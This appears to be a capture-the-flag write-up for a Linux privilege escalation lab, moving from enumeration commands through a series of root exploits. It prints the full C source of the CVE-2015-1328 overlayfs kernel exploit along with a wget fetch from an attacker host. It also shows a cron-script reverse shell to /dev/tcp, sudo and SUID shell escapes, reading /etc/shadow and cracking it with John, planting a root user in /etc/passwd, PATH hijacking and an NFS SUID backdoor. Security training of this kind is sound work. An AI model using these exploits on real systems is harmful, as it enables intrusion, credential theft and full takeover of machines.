
Introduction to Privilege Escalation

• Gaining higher-level access from a lower-privileged account.

• Exploiting vulnerabilities, misconfigurations, or design flaws to access restricted resources.

Why is it important?

• Initial access rarely provides full control.

• Allows deeper system compromise and control.

What can it do?

• Reset passwords.

• Bypass access controls.

• Modify system settings & software.

• Maintain persistence.

• Create or elevate user privileges.

• Execute admin-level commands.
Linux Post-Exploitation Enumeration

1️⃣ System Information

• hostname → Get system hostname (may indicate server role).

• uname -a → Show kernel & OS details (useful for kernel exploits).

• /proc/version → Kernel version & compiler details.

• /etc/issue → OS identification file (can be customized).

2️⃣ User & Privilege Info

• id → Show user ID & group memberships.

• /etc/passwd → List system users.

• sudo -l → Check allowed sudo commands.

3️⃣ Process & Command History

• ps -A → List all running processes.

• ps aux → Show process owners & details.

• history → View previously executed commands (may reveal creds).

4️⃣ Environment & File Enumeration

• env → List environment variables (check for useful paths).

• ls -la → List all files, including hidden ones.

• find / -perm -u=s -type f 2>/dev/null → Find SUID binaries (potential privilege escalation).

• find / -writable -type d 2>/dev/null → Find world-writable directories.

• /etc/passwd | grep home → Extract real users (ignore system users).

5️⃣ Network & Pivoting Information

• ifconfig / ip a → Show network interfaces.

• ip route → Display routing table.

• netstat -ano → Show active connections, listening ports & processes.

• netstat -tp → List connections with PID & service names.

6️⃣ Finding Exploitable Files

• find / -name flag1.txt → Search for specific files.

• find / -perm 0777 → Find files with full read/write/execute permissions.

• find / -type f -mtime -10 → List files modified in last 10 days.

• find / -size +100M → Find files larger than 100MB.

7️⃣ Checking for Development Tools (Code Execution)

• find / -name python* → Locate Python installations.

• find / -name gcc* → Locate GCC compiler (potential for privilege escalation).
Enumeration
Identifying the Hostname

$ hostname
wade7363

The hostname “wade7363” identifies the system. While this may not always be meaningful, in some cases, it can indicate a machine’s role within a network.
2️⃣ Checking Linux Kernel Version

$ uname -r
3.13.0-24-generic

The kernel version is 3.13.0–24-generic. This version is outdated and may contain security vulnerabilities that can be exploited for privilege escalation.
3️⃣ Determining the Linux Distribution

$ cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"

The system runs Ubuntu 14.04 LTS (Trusty Tahr), which reached its end-of-life (EOL) in April 2019. Running an unsupported OS exposes the system to unpatched security vulnerabilities.
4️⃣ Checking Installed Python Version

$ python --version
Python 2.7.6

The system has Python 2.7.6, which is obsolete and no longer maintained. Many security vulnerabilities exist in older Python versions.

CVE-2015–1328 — Kernel Vulnerability in Ubuntu 14.04 (3.13.0–24-generic)

📌 Vulnerability Overview

CVE-2015–1328 affects Ubuntu systems running the 3.13.0–24-generic kernel. This vulnerability is a privilege escalation flaw caused by improper handling of user namespaces in the OverlayFS filesystem.
Exploitdb website result for kernel 3.13.0–24-generic
🔍 Linux Privilege Escalation Enumeration Tools

• LinPEAS — Advanced Linux enumeration script for privilege escalation.

👉 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

• LinEnum — Automates basic Linux privilege escalation checks.

👉 https://github.com/rebootuser/LinEnum

• LES (Linux Exploit Suggester) — Suggests kernel-based privilege escalation exploits.

👉 https://github.com/mzet-/linux-exploit-suggester

• Linux Smart Enumeration — Lightweight, categorized Linux enumeration tool.

👉 https://github.com/diego-treitos/linux-smart-enumeration

• Linux Priv Checker — Python-based script for privilege escalation checks.

👉 https://github.com/linted/linuxprivchecker

⚠️ Considerations:

• Tool selection depends on the target system’s environment (e.g., Python-based tools won’t run if Python is absent).

• It’s best to be familiar with multiple tools instead of relying on just one.
🔑 Privilege Escalation via Kernel Exploits

• Goal: Gain root privileges by exploiting kernel vulnerabilities.

• Approach: Identify kernel version → Find exploit → Execute carefully.

• Risk: Kernel exploits can cause system crashes. Use only when acceptable in pentesting engagements.

🔍 Kernel Exploitation Steps

1️⃣ Identify Kernel Version

• Run: uname -r

• Example Output: 3.13.0–24-generic

2️⃣ Search for Exploits

• Google: Linux 3.13.0–24 exploit site:exploit-db.com

• Check databases:

• Exploit-DB

• CVE Details

• Linux Exploit Suggester (LES)

    3️⃣ Transfer & Execute Exploit

    Download the Exploit code and save it as exploit.c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <sched.h>
    #include <sys/stat.h>
    #include <sys/types.h>
    #include <sys/mount.h>
    #include <sys/wait.h>
    #include <signal.h>
    #include <fcntl.h>
    #include <string.h>
    #include <linux/sched.h>
    #include <dlfcn.h>

    #define LIB “#include <unistd.h>\n\nuid_t(*_real_getuid)(void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \”getuid\”);\nreadlink(\”/proc/self/exe\”, (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \”/bin/su\”)) {\nunlink(\”/etc/ld.so.preload\”);unlink(\”/tmp/ofs-lib.so\”);\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\”/bin/sh\”, \”sh\”, \”-i\”, NULL, NULL);\n}\n return _real_getuid();\n}\n”

    static char child_stack[1024 * 1024];

    static int child_exec(void *stuff) {
    char *file;
    system(“rm -rf /tmp/ns_sploit”);
    mkdir(“/tmp/ns_sploit”, 0777);
    mkdir(“/tmp/ns_sploit/work”, 0777);
    mkdir(“/tmp/ns_sploit/upper”, 0777);
    mkdir(“/tmp/ns_sploit/o”, 0777);

    fprintf(stderr, “mount #1\n”);
    if (mount(“overlay”, “/tmp/ns_sploit/o”, “overlayfs”, MS_MGC_VAL, “lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper”) != 0) {
    if (mount(“overlay”, “/tmp/ns_sploit/o”, “overlay”, MS_MGC_VAL, “lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work”) != 0) {
    fprintf(stderr, “no FS_USERNS_MOUNT for overlayfs on this kernel\n”);
    exit(-1);
    }
    file = “.access”;
    chmod(“/tmp/ns_sploit/work/work”, 0777);
    } else {
    file = “ns_last_pid”;
    }

    chdir(“/tmp/ns_sploit/o”);
    rename(file, “ld.so.preload”);

    chdir(“/”);
    umount(“/tmp/ns_sploit/o”);

    fprintf(stderr, “mount #2\n”);
    if (mount(“overlay”, “/tmp/ns_sploit/o”, “overlayfs”, MS_MGC_VAL, “lowerdir=/tmp/ns_sploit/upper,upperdir=/etc”) != 0) {
    if (mount(“overlay”, “/tmp/ns_sploit/o”, “overlay”, MS_MGC_VAL, “lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work”) != 0) {
    exit(-1);
    }
    chmod(“/tmp/ns_sploit/work/work”, 0777);
    }

    chmod(“/tmp/ns_sploit/o/ld.so.preload”, 0777);
    umount(“/tmp/ns_sploit/o”);
    return 0;
    }

    int main(int argc, char **argv) {
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr, “spawning threads\n”);

    if ((wrapper = fork()) == 0) {
    if (unshare(CLONE_NEWUSER) != 0) {
    fprintf(stderr, “failed to create new user namespace\n”);
    exit(-1);
    }

    if ((init = fork()) == 0) {
    pid_t pid = clone(child_exec, child_stack + (1024 * 1024), clone_flags, NULL);
    if (pid < 0) {
    fprintf(stderr, “failed to create new mount namespace\n”);
    exit(-1);
    }

    waitpid(pid, &status, 0);
    }

    waitpid(init, &status, 0);
    return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr, “child threads done\n”);

    fd = open(“/etc/ld.so.preload”, O_WRONLY);

    if (fd == -1) {
    fprintf(stderr, “exploit failed\n”);
    exit(-1);
    }

    fprintf(stderr, “/etc/ld.so.preload created\n”);
    fprintf(stderr, “creating shared library\n”);
    lib = open(“/tmp/ofs-lib.c”, O_CREAT | O_WRONLY, 0777);
    write(lib, LIB, strlen(LIB));
    close(lib);

    lib = system(“gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w”);
    if (lib != 0) {
    fprintf(stderr, “couldn’t create dynamic library\n”);
    exit(-1);
    }

    write(fd, “/tmp/ofs-lib.so\n”, 16);
    close(fd);
    system(“rm -rf /tmp/ns_sploit /tmp/ofs-lib.c”);

    execl(“/bin/su”, “su”, NULL);
    }

• Use Python3 HTTP server to transfer the exploit:

python3 -m http.server 8080  # On the attacker's machine


cd /tmp # On target machine
wget http://attacker-ip:8080/exploit.c  # On target machine

• Compile & run:

gcc exploit.c -o exploit
chmod +x exploit
./exploit

Inside /tmp we download malicious code and executed we got root access
Inside /matt we captured flag1

Privilege Escalation via sudo (GTFOBins)

1. Checking Sudo Privileges

• sudo -l output shows karen can run the following without a password:

• /usr/bin/find

• /usr/bin/less

• /usr/bin/nano

2. Exploiting find (Spawn Root Shell)

sudo find . -exec /bin/bash \; -quit

3. Exploiting less (Shell Escape)

1. Open any file with less:

sudo less /etc/passwd
or 
sudo less /etc/profile

2. Press v (opens file in nano).

3. In nano, press Ctrl+R → Ctrl+X.

4. Enter:

sh
or
!/bin/sh

• This spawns a root shell.

4. Exploiting nano (Shell Escape)

1. Open nano:

sudo nano

2. Press Ctrl+R → Ctrl+X.

3. Enter:

reset; sh 1>&0 2>&0

• This gives a root shell.
exploit using find binary and captured the flag2
Reading /etc/shadow we got frank’s hash
Privilege Escalation via SUID

1. Understanding SUID & SGID

• SUID (s bit) allows execution with the file owner’s privileges.

• SGID allows execution with the group owner’s privileges.

• Find SUID files:

find / -type f -perm -04000 -ls 2>/dev/null

Privilege Escalation via SUID

1. Understanding SUID & SGID

• SUID (s bit): Executes the file with the file owner’s privileges (e.g., root).

• SGID: Executes the file with the group owner’s privileges.

• Find SUID files:

find / -type f -perm -4000 -ls 2>/dev/null

• Check GTFOBins for exploitable SUID binaries:

• GTFOBins SUID List

2. Exploiting SUID base64 (File Read Exploit)

If base64 has the SUID bit set, it can be used to read files with elevated privileges.

• Read /etc/shadow:

LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode

• Read /etc/passwd:

cat /etc/passwd

• Copy the contents to the attacker’s machine and save them as passwd.txt and shadow.txt for later password cracking.

3. Cracking Passwords

1. Use unshadow to prepare for password cracking:

unshadow passwd.txt shadow.txt > password.txt

2. Crack with John the Ripper:

john --wordlist=/usr/share/wordlists/rockyou.txt password.txt

Option 2: Add a New Root User (Faster Privilege Escalation)

1. Generate a password hash:

openssl passwd -1 -salt root mypassword

• Example output: $1$root$abc123xyz456

2. Edit /etc/passwd with nano and add a new root user:

nano /etc/passwd

• Add this line at the bottom:

myuser:$1$root$abc123xyz456:0:0:root:/root:/bin/bash

3. Switch to the new root user:

su myuser

4. Gain root access! 🎉
Using the find command, we identified a SUID binary for base64. Then, leveraging GTFOBins, I used base64 as a File Read binary to read the contents of /etc/shadow.
Cracking passwords using John the Ripper
Linux Capabilities & Privilege Escalation

1. What are Capabilities?

• Granular privilege management for binaries/processes.

• Allows specific actions (e.g., initiating sockets) without full root access.

2. Checking Capabilities:

• Use getcap to list enabled capabilities:

getcap -r / 2>/dev/null

Exploiting Capabilities for Privilege Escalation (vim)

1. Identified Capabilities:

    Running getcap -r / 2>/dev/null revealed:

/home/karen/vim = cap_setuid+ep

This means vim has the capability to change its UID, which can be exploited.

2. Confirming Binary Permissions:

ls -l /home/karen/vim
-rwxr-xr-x 1 root root 2906824 Jun 18  2021 /home/karen/vim

The binary is owned by root, making it a potential privilege escalation vector.

3. Exploiting vim via GTFObins:

• Copy vim locally and set the required capability:

cp $(which vim) .
sudo setcap cap_setuid+ep vim

• Execute vim to spawn a root shell:

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

• This grants a root shell by leveraging the cap_setuid capability.
Running getcap -r / 2>/dev/null and vim has the capability to change its UID
Execute vim and captured flag4
Privilege Escalation via Cron Jobs

1. Understanding Cron Jobs:

• Automates script execution at scheduled intervals.

• Runs with the privileges of the script owner.

2. Finding Misconfigured Cron Jobs:

• Check system-wide cron jobs:

cat /etc/crontab
ls -la /etc/cron.*

• Discovered a scheduled script:

/home/karen/backup.sh

3. Exploiting a Writable Cron Job Script:

• If backup.sh is writable, inject a reverse shell:

echo '#!/bin/bash' > /home/karen/backup.sh
echo 'bash -i >& /dev/tcp/attacker IP/8888 0>&1' >> /home/karen/backup.sh
chmod +x /home/karen/backup.sh

4. Starting a Listener on the Attacker Machine:

• Set up Netcat to catch the reverse shell:

nc -lvnp 8888

5. Wait for Execution & Gain a Root Shell:

• Once the cron job runs, it executes backup.sh as root, establishing a connection to the attacker.

• If successful, you should receive a root shell on the listening machine.
Reading /etc/crontab and we observed 3 scheduled script i.e .sh scripts
Reading backup.sh
Modifying backup.sh and injecting a reverse shell
Listening port 8888 and got root access, captured flag5
Matt’s password captured (copy matt’s hash from /etc/shadow)
Privilege Escalation via PATH Manipulation

1. Understanding PATH in Linux:

    $PATH is an environment variable that defines directories where Linux searches for executables.
    If a writable folder is in $PATH, it can be exploited to hijack a privileged process.

Check the current $PATH:

echo $PATH

Example output:

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

2. Key Questions to Ask:

What folders are in $PATH? (echo $PATH)
Does the user have write access to any folder in $PATH?
Can $PATHbe modified?
Is there a script/binary running as root that can be hijacked?
3. Finding Writable Directories:

    Identify writable folders:

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

Example output:

snap/core20
usr/lib
home/murdoch

    Check if any writable folder is in $PATH.

Observing /home/murdoch:

cd /home/murdoch
ls -l

Example output:

total 24
-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py

Inspecting thm.py:

cat thm.py

Output:

/usr/bin/python3
import os
import sys
try:
    os.system("thm")
except:
    sys.exit()

    The script executes a binary named thm, which we can hijack if we control the $PATH.

4. Exploiting the Vulnerability:
1. Modify $PATH to Include a Writable Directory:

export PATH=/tmp:$PATH

2. Create a Fake Executable inside /tmp (Privilege Hijack):

cd /tmp
echo '/bin/bash' > thm
chmod +x thm
ls -l /tmp/thm

Expected output:

-rwxr-xr-x 1 user user  42 Mar 28 11:06 thm

    This script copies /bin/bash with the SUID bit, allowing it to be executed as root.

3. Trigger the Privileged Script:

cd /home/murdoch
./test

    Since /home/murdoch/test runs as root and executes thm, it will run our malicious binary. This launches a root shell with full privileges.

Current $PATH and Modifying $PATH
Reading Python script
Adding fake Executable inside /tmp
Gain Root access & captured flag6
NFS Privilege Escalation (No Root Squash Exploit)

1. Identify NFS Shares on the Victim Machine

    Beyond Internal Access: Shared folders, SSH, and Telnet can provide root access.
    Multiple Vectors: Finding a root SSH key can allow direct login instead of manual privilege escalation
    CTFs & Exams: Misconfigured network shells or backup systems may be exploitable.
    NFS(Network File Sharing) Misconfiguration: The /etc/exports file defines shared directories and can expose security weaknesses.

Understanding NFS Misconfiguration for Privilege Escalation

The /etc/exports file on the victim machine defines NFS shared directories and their permissions.
Key Misconfigurations

    rw (Read/Write Access) → Allows clients to write to shared folders.
    insecure → Allows non-privileged ports to access NFS.
    no_root_squash → Preserves root privileges on mounted shares, allowing file execution as root.

Exploitable Entries

/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)

These settings can be exploited by an attacker to gain root access by mounting the share and placing an SUID binary.

    Run the following command on the attacker machine to list shared directories:

showmount -e <target-ip>

Example output:

Export list for 10.10.171.146:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup

2. Mount an NFS Share
On the attacker machine, mount a writable NFS share:

mkdir /tmp/sharedfolder
mount -o rw <target-ip>:/home/ubuntu/sharedfolder /tmp/sharedfolder

3. Create a Malicious Binary
Create a C program that spawns a root shell:

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}

Save it as nfs.c inside /tmp/sharedfolder.

4. Compile and Set SUID

gcc nfs.c -o nfs -w
chmod +s nfs

5. Execute on Victim Machine
Now, switch to the victim machine and execute the backdoor:

cd /home/ubuntu/sharedfolder
./nfs
whoami

You should now have root access. 🎯
Reading /etc/exports file on the victim machine
list shared directories on attacker machine
mount a writable NFS share
switch to the victim machine and execute the backdoor
Step 1: Enumerate SUID Binaries

1.find / -type f -perm -04000 -ls 2>/dev/null

You found /usr/bin/base64, which is SUID, meaning it runs with root privileges.
Step 2: Read /etc/passwd

Since /etc/passwd is world-readable, simply copy its contents:

cat /etc/passwd > pass.txt

Step 3: Read /etc/shadow Using Base64 SUID Exploit

Since you don’t have direct read access to /etc/shadow, use GTFOBins Base64 SUID Exploit:

LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode > shadow.txt

Now, you have the hashed passwords.
Step 4: Combine /etc/passwd and /etc/shadow

Use unshadow to create a format John can crack:

unshadow pass.txt shadow.txt > Password.txt

Step 5: Crack Passwords with John the Ripper

Run John with the rockyou.txt wordlist:

john --wordlist=/usr/share/wordlists/rockyou.txt Password.txt

You cracked a password:
✅ Username: missy
✅ Password: Password1
Step 6: SSH into Missy’s Account

Now, log in as missy:

ssh missy@<target-ip>

Step 7: Check sudo privileges

Running sudo -l revealed:

(ALL) NOPASSWD: /usr/bin/find

Since you can run find as root without a password, use GTFOBins Find Privilege Escalation:

sudo find . -exec /bin/sh \; -quit

🔥 Root shell obtained! 🔥
Final Step: Confirm Root Access

whoami
# root

cat /root/root.txt
# Capture the flag 🎯

💥 Hurray! owned the machine! 🏆
Check for SUID binaries
Cracking missy’s Password
SSH logged in as missy
Since we can run find as root without a password, use GTFOBins
